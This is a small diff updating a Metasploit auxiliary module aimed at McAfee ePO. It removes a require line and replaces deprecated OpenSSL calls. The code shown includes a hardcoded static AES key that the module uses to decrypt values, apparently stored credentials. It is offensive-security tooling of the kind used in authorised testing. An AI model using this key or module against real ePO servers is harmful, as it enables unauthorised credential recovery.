@@ -3,7 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'openssl'
 
 class MetasploitModule < Msf::Auxiliary
@@ -52,13 +51,13 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('TARGETURI', [ true, "Base ePO directory path", '/']),
         OptString.new('USERNAME', [true, "The username to authenticate with", "username"]),
         OptString.new('PASSWORD', [true, "The password to authenticate with", "password"])
-      ], self.class)
+      ])
   end
 
   def run
     key = "\x5E\x9C\x3E\xDF\xE6\x25\x84\x36\x66\x21\x93\x80\x31\x5A\x29\x33" #static key used
 
-    aes = OpenSSL::Cipher::Cipher.new('AES-128-ECB') # ecb, bad bad tsk
+    aes = OpenSSL::Cipher.new('AES-128-ECB') # ecb, bad bad tsk
     aes.decrypt
     aes.padding=1
     aes.key = key
